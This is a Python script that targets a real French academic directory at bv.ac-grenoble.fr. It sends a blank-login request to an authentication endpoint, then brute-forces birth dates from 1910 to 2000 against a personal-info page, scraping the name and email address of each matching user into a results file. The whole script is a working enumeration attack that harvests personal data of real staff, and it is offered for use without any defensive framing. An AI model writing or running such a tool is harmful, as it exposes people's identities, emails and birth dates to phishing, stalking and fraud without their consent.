import requests
import urllib.parse
from termcolor import colored, cprint
from bs4 import BeautifulSoup as bs
import sys

def process(day, month, year):

    params = {'daten1': day, 'daten2': month, 'daten3': year}

    auth_url = 'https://bv.ac-grenoble.fr/searchannu/src/infos_perso/etape2.php?login=%20'
    get_infos_url = 'https://bv.ac-grenoble.fr/searchannu/src/infos_perso/infos_perso.php?'

    urllib.parse.urlencode(params)

    requests.post(auth_url)
    req = requests.get(get_infos_url, params)
    get_response = req.text

    profile_finded = "Informations" in get_response
    if profile_finded:
        soup = bs(get_response, 'html.parser')
        infos = {
            'name': soup.findAll('td')[1].get_text(),
            'mail': soup.findAll('a')[0].get_text(),
        }
        result_file = open("result.txt", "a")
        result_file.write(infos['name'] + ": " + infos['mail'] + " ==> " + str(day) + "/" + str(month) + "/" + str(year) + '\n')
        result_file.close()
        cprint(str(day) + "/" + str(month) + "/" + str(year) + " -- Academic user found: " + infos['name'], 'green', 'on_grey')
    else:
        cprint(str(day) + "/" + str(month) + "/" + str(year) + " -- No Academic user found with this date", 'red', 'on_grey')

def automaticMode(year_to_start, year_to_end):
    day = 1
    month = 1
    while year_to_start <= year_to_end:
        while month <= 12:
            while day <= 31:
                process(day, month, year_to_start)
                day += 1
            month += 1
            day = 1
        year_to_start += 1
        month = 1

def withInput():
    day = int(input("Day: "))
    month = int(input("Month: "))
    year = int(input("Year: "))
    process(day, month, year)

def orchestra():
    choice = input("Mode pilote automatique ? (y/n)\n")
    if choice == "y":
        automaticMode(1910, 2000)
    elif choice == "n":
        withInput()
    else:
        print('Vous devez entrer "y" (oui) ou "n" (non)')
        orchestra()

if __name__ == '__main__':
    orchestra()
